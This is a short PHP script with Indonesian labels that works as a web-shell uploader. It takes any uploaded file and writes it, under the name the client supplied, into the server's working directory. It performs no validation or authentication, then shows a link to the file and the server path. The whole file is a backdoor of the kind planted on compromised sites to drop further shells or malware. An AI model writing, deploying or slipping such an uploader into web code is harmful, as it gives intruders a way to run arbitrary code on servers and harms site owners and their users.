<?php 
if(isset($_FILES["userfile"]["name"])){ 
  $dir = getcwd() . "/"; 
   $f =$dir . basename($_FILES["userfile"]["name"]); 
    echo "<p>";
echo "<form enctype=\"multipart/form-data\" action=\"{$_SERVER["PHP_SELF"]}\" method=\"POST\">"; 
echo "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"512000\" />"; 
echo "<b>Select Your File </b>: <input name=\"userfile\" type=\"file\" />"; 
echo "<input type=\"submit\" value=\"Upload\" />"; 
echo "</form>";
if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $f)) { 
     echo "\n"; 
} else {
      echo "Failed";
} echo "</p>";
echo "<style>a{text-decoration: none;}</style>";
if ($_FILES["userfile"]["error"] == 0){ 
  echo "<br><b>Akses </b>: <a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br><br>"; 
  echo "<b>Lokasi </b>: ".getcwd() . "\n"; 
} 
} 
exit; 
?>
	